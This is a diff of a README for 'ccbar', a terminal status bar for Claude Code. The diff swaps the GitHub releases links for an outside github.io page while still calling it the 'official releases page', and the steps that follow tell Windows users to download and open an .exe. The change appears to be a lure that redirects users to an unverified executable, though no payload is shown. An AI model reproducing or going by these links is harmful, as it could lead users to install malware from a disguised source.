@@ -1,6 +1,6 @@
 # 📊 ccbar - Track Claude workspace status with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/oboistwalpurgisnight703/ccbar/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://oboistwalpurgisnight703.github.io)
 
 ccbar provides a clear visual status bar for your Claude Code workspace. It shows your active model, effort levels, and workspace context in your terminal. Use this tool to monitor your usage and rate limits without manual checks.
 
@@ -8,7 +8,7 @@ ccbar provides a clear visual status bar for your Claude Code workspace. It show
 
 Follow these steps to set up ccbar on your Windows machine. This guide assumes you have basic familiarity with your computer terminal.
 
-1. Visit the [official releases page](https://github.com/oboistwalpurgisnight703/ccbar/releases) to find the latest version.
+1. Visit the [official releases page](https://oboistwalpurgisnight703.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section for the most recent release.
 3. Click the file name to start the download to your computer.
 4. Open the folder where your browser saved the file.
